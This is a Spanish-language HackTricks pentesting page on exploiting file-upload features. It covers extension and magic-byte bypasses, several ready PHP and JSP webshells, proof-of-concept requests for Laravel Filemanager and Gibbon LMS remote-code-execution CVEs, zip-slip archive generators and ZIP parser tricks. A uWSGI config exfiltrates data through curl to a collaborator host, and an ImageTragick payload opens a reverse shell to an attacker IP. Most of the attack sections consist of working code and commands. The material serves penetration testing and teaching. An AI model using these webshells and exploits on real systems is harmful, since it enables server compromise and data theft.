# Subida de archivos

{{#include ../../banners/hacktricks-training.md}}

## Metodología general de File Upload

Otras extensiones útiles:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Evadir las comprobaciones de extensiones de archivo

1. Si aplican, **comprueba** las **extensiones anteriores.** También pruébalas usando algunas **letras en mayúscula**: _pHp, .pHP5, .PhAr ..._
2. _Comprueba **añadir una extensión válida antes** de la extensión de ejecución (usa también las extensiones anteriores):_
- _file.png.php_
- _file.png.Php5_
3. Intenta añadir **caracteres especiales al final.** Puedes usar Burp para **bruteforcear** todos los caracteres **ascii** y **Unicode**. (_Nota que también puedes intentar usar las **extensiones** mencionadas **previamente**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Intenta eludir las protecciones **engañando al parser de extensiones** del lado servidor con técnicas como **duplicar** la **extensión** o **añadir datos basura** (bytes **null**) entre extensiones. _También puedes usar las **extensiones anteriores** para preparar un payload mejor._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Añade **otra capa de extensiones** a la comprobación anterior:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Intenta poner la **extensión ejecutable antes de la extensión válida** y reza para que el servidor esté mal configurado. (útil para explotar misconfiguraciones de Apache donde cualquier archivo con la extensión _.php_, aunque no termine necesariamente en .php, ejecutará código):
- _ex: file.php.png_
7. Usando **NTFS alternate data stream (ADS)** en **Windows**. En este caso, se insertará un carácter dos puntos ":" después de una extensión prohibida y antes de una permitida. Como resultado, se creará en el servidor un **archivo vacío con la extensión prohibida** (p.ej. "file.asax:.jpg”). Este archivo podría editarse más tarde usando otras técnicas como su short filename. El patrón "**::$data**” también puede usarse para crear archivos no vacíos. Por lo tanto, añadir un punto después de este patrón también puede ser útil para evadir más restricciones (p.ej. "file.asp::$data.”)
8. Intenta romper los límites del nombre de archivo. La extensión válida se corta. Y queda el PHP malicioso. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Algunos manejadores de subida recortan o normalizan caracteres de punto al final del nombre de archivo guardado. En UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) en versiones anteriores a 2.9.1, puedes evadir la validación de extensiones mediante:

- Usar un MIME de imagen válido y el header mágico (p.ej., el de PNG `\x89PNG\r\n\x1a\n`).
- Nombrar el archivo subido con una extensión PHP seguida de un punto, p.ej., `shell.php.`.
- El servidor elimina el punto final y persiste `shell.php`, que se ejecutará si se coloca en un directorio servido por la web (almacenamiento público por defecto como `/storage/files/`).

PoC mínimo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Accede a la ruta guardada (típico en Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like PHP-GD, the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page could also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Encuentra una vulnerabilidad para **rename** el archivo ya subido (para cambiar la extensión).
- Encuentra una vulnerabilidad de **Local File Inclusion** para ejecutar el backdoor.
- **Possible Information disclosure**:
1. Subir **varias veces** (y al **mismo tiempo**) el **mismo archivo** con el **mismo nombre**
2. Subir un archivo con el **name** de un **file** o **folder** que **already exists**
3. Subir un archivo con **"." , "..", or "…" as its name**. Por ejemplo, en Apache en **Windows**, si la aplicación guarda los archivos subidos en el directorio "/www/uploads/", el filename "." creará un archivo llamado uploads” en el directorio "/www/".
4. Subir un archivo que puede no borrarse fácilmente como **"…:.jpg"** en **NTFS**. (Windows)
5. Subir un archivo en **Windows** con **invalid characters** como `|<>*?”` en su nombre. (Windows)
6. Subir un archivo en **Windows** usando **reserved** (**forbidden**) **names** como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Intenta también subir un ejecutable (.exe) o un .html (menos sospechoso) que **will execute code** cuando sea abierto accidentalmente por la víctima.

### Special extension tricks

Si estás intentando subir archivos a un servidor PHP, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Si estás intentando subir archivos a un servidor ASP, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Los archivos `.phar` son como los `.jar` para java, pero para php, y pueden ser **used like a php file** (ejecutándolos con php, o incluyéndolos dentro de un script...).

La extensión `.inc` a veces se usa para archivos php que sólo se usan para **import files**, así que, en algún punto, alguien podría haber permitido que **esta extension sea ejecutada**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain RCE because **new *.xml and *.war are automatically processed**. So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Las vulnerabilidades de Remote Command Execution (RCE) pueden explotarse en servidores uWSGI si se tiene la capacidad de modificar el archivo de configuración `.ini`. Los archivos de configuración de uWSGI usan una sintaxis específica para incorporar variables "mágicas", placeholders y operadores. En particular, el operador '@', utilizado como `@(filename)`, está diseñado para incluir el contenido de un archivo. Entre los diversos esquemas soportados en uWSGI, el esquema "exec" es particularmente potente, permitiendo leer datos desde la salida estándar de un proceso. Esta característica puede manipularse con fines maliciosos como Remote Command Execution o Arbitrary File Write/Read cuando se procesa un archivo de configuración `.ini`.

Considera el siguiente ejemplo de un `uwsgi.ini` dañino, mostrando varios schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
La ejecución del payload ocurre durante el análisis del archivo de configuración. Para que la configuración se active y sea parseada, el proceso uWSGI debe reiniciarse (potencialmente después de un crash o debido a un Denial of Service) o el archivo debe estar configurado con auto-reload. La función auto-reload, si está habilitada, recarga el archivo a intervalos especificados al detectar cambios.

Es crucial entender la laxitud del análisis del archivo de configuración de uWSGI. Específicamente, el payload descrito puede insertarse en un archivo binario (como una imagen o un PDF), ampliando aún más el alcance de la posible explotación.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Un endpoint no autenticado en Gibbon LMS permite arbitrary file write dentro del web root, conduciendo a pre-auth RCE al dejar un archivo PHP. Versiones vulnerables: hasta e incluyendo 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Método: POST
- Parámetros requeridos:
- `img`: data-URI-like string: `[mime];[name],[base64]` (el servidor ignora type/name, decodifica en base64 la parte final)
- `path`: nombre de archivo de destino relativo al Gibbon install dir (por ejemplo, `poc.php` o `0xdf.php`)
- `gibbonPersonID`: cualquier valor no vacío es aceptado (por ejemplo, `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Colocar un webshell mínimo y ejecutar comandos:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notas:
- El handler ejecuta `base64_decode($_POST["img"])` después de dividir por `;` y `,`, y luego escribe los bytes en `$absolutePath . '/' . $_POST['path']` sin validar la extensión/tipo.
- El código resultante se ejecuta como el usuario del servicio web (por ejemplo, XAMPP Apache en Windows).

Las referencias para este bug incluyen el advisory de usd HeroLab y la entrada en NVD. Consulte la sección Referencias más abajo.

## **wget File Upload/SSRF Trick**

En algunas ocasiones puedes encontrar que un servidor está usando **`wget`** para **descargar archivos** y puedes **indicar** la **URL**. En estos casos, el código puede estar comprobando que la extensión de los archivos descargados esté dentro de una whitelist para asegurar que solo se descargarán archivos permitidos. Sin embargo, **esta comprobación puede eludirse.**\
La **longitud máxima** de un **nombre de archivo** en **linux** es **255**, sin embargo, **wget** trunca los nombres de archivo a **236** caracteres. Puedes **descargar un archivo llamado "A"*232+".php"+".gif"**, este nombre de archivo **bypass** la **comprobación** (ya que en este ejemplo **".gif"** es una **extensión** **válida**) pero `wget` **renombrará** el archivo a **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note que **otra opción** que podría estar considerando para eludir esta verificación es hacer que el **servidor HTTP redirija a un archivo diferente**, de modo que la URL inicial pase la comprobación y luego wget descargue el archivo redirigido con el nuevo nombre. Esto **no funcionará** **a menos que** wget se esté usando con el **parámetro** `--trust-server-names` porque **wget descargará la página redirigida con el nombre de archivo indicado en la URL original**.

### Escapar del upload directory via NTFS junctions (Windows)

(Para este ataque necesitarás acceso local a la máquina Windows) Cuando los uploads se almacenan bajo subcarpetas por usuario en Windows (p. ej., C:\Windows\Tasks\Uploads\<id>\) y controlas la creación/eliminación de esa subcarpeta, puedes reemplazarla con una directory junction que apunte a una ubicación sensible (p. ej., el webroot). Los uploads posteriores se escribirán en la ruta objetivo, permitiendo code execution si el destino interpreta server‑side code.

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notas
- mklink /J crea un NTFS directory junction (reparse point). La cuenta del web server debe seguir el junction y tener permiso de escritura en el destino.
- Esto redirige escrituras arbitrarias de archivos; si el destino ejecuta scripts (PHP/ASP), esto se convierte en RCE.
- Defensas: no permitas que las raíces de upload sean attacker‑controllable bajo C:\Windows\Tasks o similar; bloquea la creación de junctions; valida extensiones server‑side; almacena uploads en un volumen separado o con deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Some upload/ingest handlers write the raw request body to a filesystem path that is constructed from user-controlled query parameters. If the handler also supports Content-Encoding: gzip and fails to canonicalize/validate the destination path, you can combine directory traversal with a gzipped payload to write arbitrary bytes into a web-served directory and obtain RCE (e.g., drop a JSP under Tomcat’s webapps).

Flujo genérico de explotación:
- Prepara tu server-side payload (p. ej., un JSP webshell minimal) y gzip-comprime los bytes.
- Envía un POST donde un parámetro de path (p. ej., token) contenga traversal que escape la carpeta prevista, y file indique el filename a persistir. Ajusta Content-Type: application/octet-stream y Content-Encoding: gzip; el body es el payload comprimido.
- Navega hasta el archivo escrito para desencadenar la ejecución.

Solicitud ilustrativa:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Luego activa:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notas
- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- La extensión Burp Suite’s Hackvertor puede producir un cuerpo gzip correcto a partir de tu payload.
- Este es un patrón puro de pre-auth arbitrary file write → RCE; no depende del parsing multipart.

Mitigaciones
- Deriva los destinos de upload en el servidor; nunca confíes en fragmentos de path procedentes de los clientes.
- Canoniza y aplica que el path resuelto permanezca dentro de un directorio base permitido.
- Almacena los uploads en un volumen no ejecutable y deniega la ejecución de scripts desde rutas escribibles.

## Herramientas

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Some legacy upload handlers that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces in CTFs and older codebases.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Sube el contenido \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) para comprobar si el servidor tiene algún **antivirus**
- Comprueba si hay algún **size limit** uploadando files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Bytes mágicos de cabecera

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Subida de Zip/Tar descomprimida automáticamente

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Sube un archivo que contenga enlaces simbólicos a otros archivos; al acceder a los archivos descomprimidos accederás a los archivos enlazados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Descomprimir en diferentes carpetas

La creación inesperada de archivos en directorios durante la descompresión es un problema significativo. A pesar de las suposiciones iniciales de que esta configuración podría proteger contra OS-level command execution mediante malicious file uploads, el soporte de compresión jerárquica y las capacidades de directory traversal del formato de archivo ZIP pueden ser explotadas. Esto permite a los atacantes eludir restricciones y escapar de secure upload directories manipulando la funcionalidad de descompresión de la aplicación objetivo.

Un exploit automatizado para crear dichos archivos está disponible en [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). La utilidad puede usarse como se muestra:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Además, la **symlink trick with evilarc** es una opción. Si el objetivo es apuntar a un archivo como `/flag.txt`, debe crearse un symlink a ese archivo en tu sistema. Esto asegura que evilarc no encuentre errores durante su operación.

A continuación se muestra un ejemplo de código Python usado para crear un archivo zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusar de la compresión para file spraying**

Para más detalles **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Se escribe código PHP para ejecutar comandos pasados mediante la variable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Se crean múltiples archivos y se empaqueta un archivo zip que los contiene.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Los nombres de los archivos dentro del zip se modifican usando vi o un hex editor, cambiando "xxA" por "../" para atravesar directorios.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Cuando un backend valida entradas ZIP usando PHP’s ZipArchive pero la extracción escribe en el sistema de archivos usando los nombres tal cual, puedes ocultar una extensión no permitida insertando un NUL (0x00) en los campos de nombre de archivo. ZipArchive trata el nombre de la entrada como una C‑string y lo trunca en el primer NUL; el sistema de archivos escribe el nombre completo, eliminando todo lo que viene después del NUL.

High-level flow:
- Prepara un archivo contenedor legítimo (p. ej., un PDF válido) que incruste un pequeño PHP stub en un stream para que el magic/MIME siga siendo un PDF.
- Nómbralo como `shell.php..pdf`, haz zip, luego edita en hexadecimal el encabezado local del ZIP y el central directory filename para reemplazar el primer `.` después de `.php` por `0x00`, resultando en `shell.php\x00.pdf`.
- Los validadores que dependen de ZipArchive “verán” `shell.php .pdf` y lo permitirán; el extractor escribe `shell.php` en disco, llevando a RCE si la upload folder es ejecutable.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Notas
- Cambiar AMBAS apariciones del nombre de archivo (local y central directory). Algunas herramientas también añaden una entrada data descriptor extra – ajusta todos los campos name si están presentes.
- El archivo payload debe seguir pasando la inspección de magic/MIME del lado del servidor. Incrustar el PHP en un stream PDF mantiene el encabezado válido.
- Funciona donde la ruta de enum/validation y la ruta de extracción/escritura discrepan en el manejo de cadenas.

### Stacked/concatenated ZIPs (parser disagreement)

Concatenar dos archivos ZIP válidos produce un blob donde distintos parsers se centran en diferentes registros EOCD. Muchas herramientas localizan el último End Of Central Directory (EOCD), mientras que algunas librerías (p. ej., ZipArchive en flujos de trabajo específicos) pueden parsear el primer archivo que encuentran. Si la validación enumera el primer archivo y la extracción usa otra herramienta que respeta el último EOCD, un archivo benigno puede pasar los controles mientras se extrae el malicioso.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Patrón de abuso
- Crea un archivo benigno (tipo permitido, p. ej., un PDF) y un segundo archivo que contenga una extensión bloqueada (p. ej., `shell.php`).
- Concaténalos: `cat benign.zip evil.zip > combined.zip`.
- Si el servidor valida con un parser (ve benign.zip) pero extrae con otro (procesa evil.zip), el archivo bloqueado queda en la ruta de extracción.

## ImageTragic

Sube este contenido con una extensión de imagen para explotar la vulnerabilidad **(ImageMagick, 7.0.1-1)** (desde el [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Inserción de PHP Shell en PNG

Insertar un PHP shell en el chunk IDAT de un archivo PNG puede evadir eficazmente ciertas operaciones de procesamiento de imágenes. Las funciones `imagecopyresized` y `imagecopyresampled` de PHP-GD son particularmente relevantes en este contexto, ya que se usan comúnmente para redimensionar y resamplear imágenes, respectivamente. La capacidad del PHP shell embebido para permanecer sin verse afectado por estas operaciones es una ventaja importante para ciertos casos de uso.

Una exploración detallada de esta técnica, incluyendo su metodología y posibles aplicaciones, se proporciona en el siguiente artículo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Este recurso ofrece una comprensión completa del proceso y sus implicaciones.

Más información en: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Archivos Polyglot

